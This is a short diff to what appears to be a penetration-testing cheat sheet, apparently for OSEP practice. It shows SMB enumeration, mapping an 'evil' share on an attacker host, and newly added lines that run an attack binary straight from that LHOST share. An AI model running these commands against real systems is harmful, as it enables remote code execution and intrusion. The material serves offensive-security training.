@@ -7,4 +7,8 @@ smbclient -L //<RHOST> -U ''
 net use z: \\\<LHOST>\evil /user:evil evil
 dir Z:\
 
+# execute files directly from smb
+net use \\<LHOST>\share /user:<USER> <PASS>
+\\<LHOST>\share\OSEP-Code-Snippets\<ATTACK_TYPE>\bin\x64\Release\<BIN>
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
